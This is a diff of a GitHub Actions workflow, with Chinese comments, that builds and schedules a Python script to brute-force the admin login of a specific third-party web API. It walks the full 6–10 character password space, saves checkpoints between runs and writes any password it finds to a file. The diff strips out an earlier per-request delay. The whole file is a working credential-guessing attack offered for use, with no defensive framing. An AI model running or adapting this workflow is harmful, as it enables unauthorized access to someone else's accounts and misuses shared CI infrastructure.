@@ -3,7 +3,7 @@ name: Password Brute Force Complete
 on:
   workflow_dispatch:  # 允许手动触发
   schedule:
-    - cron: '0 */1 * * *'  # 每6小时运行一次
+    - cron: '0 */6 * * *'  # 每6小时运行一次
 
 jobs:
   brute-force:
@@ -22,7 +22,7 @@ jobs:
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
-        pip install requests tqdm
+        pip install requests
 
     - name: Create brute force script
       run: |
@@ -34,37 +34,27 @@ jobs:
         import time
         import os
         import itertools
-        from concurrent.futures import ThreadPoolExecutor, as_completed
-        from tqdm import tqdm
 
-        # 所有可能的字符集
+        # 所有可能的字符集（字母+数字+特殊符号）
         ALL_CHARS = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
-
-        # 密码生成器 - 按长度顺序生成
-        def password_generator(min_length=6, max_length=10):
-            for length in range(min_length, max_length + 1):
-                print(f"开始生成长度为 {length} 的密码...")
-                total_combinations = len(ALL_CHARS) ** length
-                print(f"长度 {length} 的密码总数: {total_combinations:,}")
-                
-                # 使用迭代器生成密码，避免内存爆炸
-                for chars in itertools.product(ALL_CHARS, repeat=length):
-                    yield ''.join(chars)
+        print(f"字符集大小: {len(ALL_CHARS)}")
 
         # 从检查点恢复
         def get_checkpoint():
             if os.path.exists("checkpoint.txt"):
                 with open("checkpoint.txt", "r") as f:
-                    return f.read().strip()
-            return None
+                    line = f.readline().strip()
+                    if line:
+                        return tuple(line.split("|"))
+            return (6, 0)  # 默认从长度6，索引0开始
 
         # 保存检查点
-        def save_checkpoint(password):
+        def save_checkpoint(length, index):
             with open("checkpoint.txt", "w") as f:
-                f.write(password)
+                f.write(f"{length}|{index}")
 
         # 尝试登录的函数
-        def try_login(password, attempt, total_attempts):
+        def try_login(password):
             url = "https://zank666api.icu/proxy/api/back/back-user/login"
             
             headers = {
@@ -85,9 +75,6 @@ jobs:
             }
 
             try:
-                # 添加延迟，避免请求过于频繁
-                time.sleep(0.5)
-                
                 response = requests.post(url, headers=headers, data=json.dumps(data), timeout=15)
                 
                 # 记录尝试
@@ -96,184 +83,117 @@ jobs:
 
                 # 成功判断条件
                 if response.status_code == 200:
-                    try:
-                        response_data = response.json()
-                        success_conditions = [
-                            response_data.get("code") == 200,
-                            "token" in str(response_data).lower(),
-                            "success" in str(response_data).lower(),
-                            "成功" in str(response_data)
-                        ]
-                        if any(success_conditions):
-                            print(f"✅ 登录成功! 密码是: {password}")
-                            print(f"响应内容: {response.text}")
-                            with open("password.txt", "w") as f:
-                                f.write(password)
-                            with open("success_log.txt", "a") as f:
-                                f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - 成功密码: {password}\n")
-                            return True, password
-                    except json.JSONDecodeError:
-                        if "成功" in response.text or "token" in response.text.lower():
-                            print(f"✅ 登录成功! 密码是: {password}")
-                            with open("password.txt", "w") as f:
-                                f.write(password)
-                            return True, password
+                    success_conditions = [
+                        "token" in response.text.lower(),
+                        "success" in response.text.lower(),
+                        "成功" in response.text,
+                        '"code":200' in response.text,
+                        '"success":true' in response.text
+                    ]
+                    if any(success_conditions):
+                        print(f"✅ 登录成功! 密码是: {password}")
+                        print(f"响应内容: {response.text[:200]}...")
+                        with open("password.txt", "w") as f:
+                            f.write(password)
+                        with open("success_log.txt", "a") as f:
+                            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - 成功密码: {password}\n")
+                        return True
                 
-                if attempt % 100 == 0:
-                    print(f"[{attempt}/{total_attempts}] 尝试密码: {password} | 状态码: {response.status_code}")
-                
-                return False, None
+                return False
 
             except requests.exceptions.RequestException as e:
-                print(f"[{attempt}/{total_attempts}] 请求错误: {e}")
+                print(f"请求错误: {e}")
                 with open("error_log.txt", "a") as f:
                     f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {password} - 错误: {e}\n")
-                return False, None
+                return False
 
-        # 智能密码生成策略（避免生成所有组合）
-        def smart_password_generator():
-            # 先尝试常见模式
-            common_patterns = [
-                # 纯数字
-                *[str(i).zfill(length) for length in range(6, 11) for i in range(10**length)],
-                
-                # 字母+数字组合
-                *['admin' + str(i).zfill(2) for i in range(100)],
-                *['Admin' + str(i).zfill(2) for i in range(100)],
-                *['password' + str(i).zfill(2) for i in range(100)],
-                
-                # 常见单词+数字
-                *[word + str(i) for word in ['test', 'user', 'login', 'pass', 'secret'] for i in range(1000)],
-                
-                # 特殊字符组合
-                *['!'*length for length in range(6, 11)],
-                *['@'*length for length in range(6, 11)],
-                *['#'*length for length in range(6, 11)],
-            ]
-            
-            for pattern in common_patterns:
-                if 6 <= len(pattern) <= 10:
-                    yield pattern
-            
-            # 然后按长度顺序生成所有组合
-            for length in range(6, 11):
-                print(f"开始生成长度为 {length} 的所有组合...")
-                # 使用更高效的方式生成，避免内存问题
-                for i in range(len(ALL_CHARS) ** length):
-                    chars = []
-                    n = i
-                    for _ in range(length):
-                        chars.append(ALL_CHARS[n % len(ALL_CHARS)])
-                        n //= len(ALL_CHARS)
-                    yield ''.join(chars)
+        # 按索引生成特定位置的密码
+        def generate_password_by_index(length, index):
+            """根据索引生成指定位置的密码"""
+            password = []
+            n = index
+            for _ in range(length):
+                password.append(ALL_CHARS[n % len(ALL_CHARS)])
+                n //= len(ALL_CHARS)
+            return ''.join(password)
 
         def main():
             print("开始完整密码空间爆破...")
-            print(f"字符集: {ALL_CHARS}")
-            print(f"字符集大小: {len(ALL_CHARS)}")
-            print("=" * 60)
+            print("=" * 50)
             
             # 从检查点恢复
-            checkpoint = get_checkpoint()
-            start_from_checkpoint = checkpoint is not None
+            start_length, start_index = get_checkpoint()
+            print(f"从检查点恢复: 长度={start_length}, 索引={start_index}")
             
-            if start_from_checkpoint:
-                print(f"从检查点恢复: {checkpoint}")
-            else:
-                print("开始新的爆破会话")
-            
-            # 多线程处理
-            max_workers = 8
             found = False
-            correct_password = None
-            attempt_count = 0
+            total_tried = 0
             
-            with ThreadPoolExecutor(max_workers=max_workers) as executor:
-                futures = {}
-                password_gen = smart_password_generator()
+            # 按长度顺序尝试
+            for length in range(start_length, 11):  # 6-10位
+                total_passwords = len(ALL_CHARS) ** length
+                print(f"开始尝试长度 {length} 的密码，共 {total_passwords:,} 种组合")
                 
-                # 跳过已尝试的密码
-                if start_from_checkpoint:
-                    skipping = True
-                    for password in password_gen:
-                        if skipping:
-                            if password == checkpoint:
-                                skipping = False
-                                print(f"找到检查点，开始从下一个密码尝试")
-                            continue
+                # 计算起始索引
+                start_idx = start_index if length == start_length else 0
+                
+                for index in range(start_idx, total_passwords):
+                    if found:
                         break
+                        
+                    password = generate_password_by_index(length, index)
+                    total_tried += 1
+                    
+                    # 每1000次尝试显示进度
+                    if total_tried % 1000 == 0:
+                        print(f"已尝试 {total_tried:,} 次密码，当前: {password}")
+                        save_checkpoint(length, index)
+                    
+                    # 尝试登录
+                    if try_login(password):
+                        found = True
+                        break
+                    
+                    # 添加延迟避免请求过快
+                    if total_tried % 10 == 0:
+                        time.sleep(0.1)
                 
-                try:
-                    with tqdm(desc="尝试密码", unit="pwd") as pbar:
-                        while not found:
-                            # 提交新任务
-                            while len(futures) < max_workers * 2 and not found:
-                                try:
-                                    password = next(password_gen)
-                                    attempt_count += 1
-                                    
-                                    future = executor.submit(try_login, password, attempt_count, "many")
-                                    futures[future] = (password, attempt_count)
-                                    
-                                    # 每1000次保存检查点
-                                    if attempt_count % 1000 == 0:
-                                        save_checkpoint(password)
-                                        pbar.set_description(f"尝试密码: {password[:10]}...")
-                                        pbar.update(1000)
-                                    
-                                except StopIteration:
-                                    print("所有密码组合已尝试完毕")
-                                    break
-                            
-                            # 检查完成的任务
-                            for future in list(futures.keys()):
-                                if future.done():
-                                    password, count = futures[future]
-                                    del futures[future]
-                                    
-                                    try:
-                                        success, result_password = future.result()
-                                        if success:
-                                            found = True
-                                            correct_password = result_password
-                                            break
-                                    except Exception as e:
-                                        print(f"任务异常: {e}")
-                            
-                            if not futures:  # 所有任务都完成了
-                                break
-                                
-                            time.sleep(0.1)
-                
-                except KeyboardInterrupt:
-                    print("用户中断")
-                finally:
-                    # 取消所有未完成的任务
-                    for future in futures:
-                        future.cancel()
+                if found:
+                    break
+                    
+                # 重置起始索引为0，以便下一个长度从开始尝试
+                start_index = 0
+                save_checkpoint(length + 1, 0)
             
-            return found, correct_password
+            return found
 
         if __name__ == "__main__":
             start_time = time.time()
-            found, password = main()
+            found = main()
             end_time = time.time()
             
-            print("=" * 60)
+            print("=" * 50)
             if found:
-                print(f"🎉 爆破成功! 密码是: {password}")
+                print(f"🎉 爆破成功!")
                 print(f"总耗时: {end_time - start_time:.2f} 秒")
             else:
                 print("❌ 爆破失败，未找到正确密码")
                 print(f"总尝试时间: {end_time - start_time:.2f} 秒")
         EOF
 
+    - name: Create necessary files
+      run: |
+        touch attempt_log.txt error_log.txt
+        # 初始化检查点文件（如果不存在）
+        if [ ! -f "checkpoint.txt" ]; then
+          echo "6|0" > checkpoint.txt
+        fi
+
     - name: Run brute force
       run: |
-        # 创建必要的日志文件
-        touch attempt_log.txt error_log.txt
-        # 运行爆破脚本
-        timeout 275m python brute_force.py || echo "运行超时或中断"
+        echo "开始运行爆破脚本..."
+        # 设置超时时间为275分钟（4小时35分钟）
+        timeout 275m python brute_force.py || echo "运行完成或超时"
+        echo "爆破脚本运行结束"
 
     - name: Check if password found
       id: check_password
@@ -286,9 +206,9 @@ jobs:
           echo "PASSWORD_FOUND=false" >> $GITHUB_OUTPUT
           echo "本轮未找到密码"
           echo "📊 本轮运行完成，继续下一轮..." >> $GITHUB_STEP_SUMMARY
-          # 显示检查点信息
+          # 显示当前检查点
           if [ -f "checkpoint.txt" ]; then
-            echo "检查点: $(cat checkpoint.txt)" >> $GITHUB_STEP_SUMMARY
+            echo "当前检查点: $(cat checkpoint.txt)" >> $GITHUB_STEP_SUMMARY
           fi
         fi
 
@@ -304,9 +224,12 @@ jobs:
           checkpoint.txt
         if-no-files-found: ignore
 
-    - name: Send summary
+    - name: Show attempt statistics
       run: |
-        echo "运行完成时间: $(date)" >> $GITHUB_STEP_SUMMARY
         if [ -f "attempt_log.txt" ]; then
-          echo "尝试次数: $(wc -l < attempt_log.txt)" >> $GITHUB_STEP_SUMMARY
+          attempt_count=$(wc -l < attempt_log.txt)
+          echo "本轮尝试次数: $attempt_count" >> $GITHUB_STEP_SUMMARY
+          echo "最后尝试的密码:" >> $GITHUB_STEP_SUMMARY
+          tail -5 attempt_log.txt >> $GITHUB_STEP_SUMMARY
         fi
+        echo "运行完成时间: $(date)" >> $GITHUB_STEP_SUMMARY
